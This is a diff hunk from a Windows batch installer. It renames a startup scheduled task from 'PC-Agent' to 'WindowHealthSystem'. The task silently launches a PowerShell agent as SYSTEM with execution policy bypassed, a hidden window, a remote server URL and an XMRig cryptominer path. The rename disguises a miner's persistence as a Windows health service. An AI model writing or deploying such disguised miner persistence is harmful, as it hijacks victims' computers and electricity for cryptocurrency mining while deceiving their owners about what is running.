@@ -61,8 +61,8 @@ powershell -Command "Unblock-File -Path 'C:\ProgramData\PC-Agent\agent.ps1'" 2>n
 
 :: Create scheduled task
 echo  [3/4] Creating scheduled task...
-schtasks /delete /tn "PC-Agent" /f >nul 2>&1
-schtasks /create /tn "PC-Agent" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\ProgramData\PC-Agent\agent.ps1 -DeviceName '%DEVICE_NAME%' -ServerUrl '%SERVER_URL%' -XmrigPath '%XMRIG_PATH%'" /sc onstart /ru SYSTEM /rl HIGHEST /f
+schtasks /delete /tn "WindowHealthSystem" /f >nul 2>&1
+schtasks /create /tn "WindowHealthSystem" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\ProgramData\PC-Agent\agent.ps1 -DeviceName '%DEVICE_NAME%' -ServerUrl '%SERVER_URL%' -XmrigPath '%XMRIG_PATH%'" /sc onstart /ru SYSTEM /rl HIGHEST /f
 echo        Scheduled task created OK
 echo.
 
